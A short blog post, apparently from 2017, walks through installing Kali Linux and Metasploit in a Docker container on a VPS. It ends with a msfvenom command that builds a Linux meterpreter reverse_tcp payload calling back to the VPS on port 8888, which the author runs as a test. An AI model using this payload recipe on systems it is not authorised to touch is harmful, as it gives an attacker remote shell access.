---
layout: post
title: "Install kali and metasploit in VPS using docker"
date: 2017-06-13 15:06:01 -0500
comments: true
categories: 
---

use docker to install kali and metasploit
<!--more-->

###install docker:

`sudo apt-get install docker.io`

###download kali image:

`docker pull kalilinux/kali-linux-docker`

This kali doesn't include msf. So we need to put kali in container and then install msf

create kali container:

`docker run -t -i kalilinux/kali-linux-docker /bin/bash`

###install metasploit

`apt-get update && apt-get upgrade`
`apt-get install metasploit-framework`

after that, run metasploit

{% img  /images/blog/docker/Selection_001.png   [title manually exploit [alt text]] %}

looks good. quit msf, quit kali container.

check container ID

`sudo docker ps -a`

{% img  /images/blog/docker/Selection_002.png   [title manually exploit [alt text]] %}

save container to an image:

`sudo docker commit 6d6853205f78 msf`

now map vps tcp port 8888 to container's tcp port 8888 for reverse tcp shell

`docker run -t -p 8888:8888 -i msf /bin/bash`

###test reverse shell:

create shell:

`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[vps IP address]LPORT=8888 -f elf > shell.elf`

download shell.elf then chmod +x shell.elf

setup msf, run shell.elf

{% img  /images/blog/docker/Selection_003.png   [title manually exploit [alt text]] %}
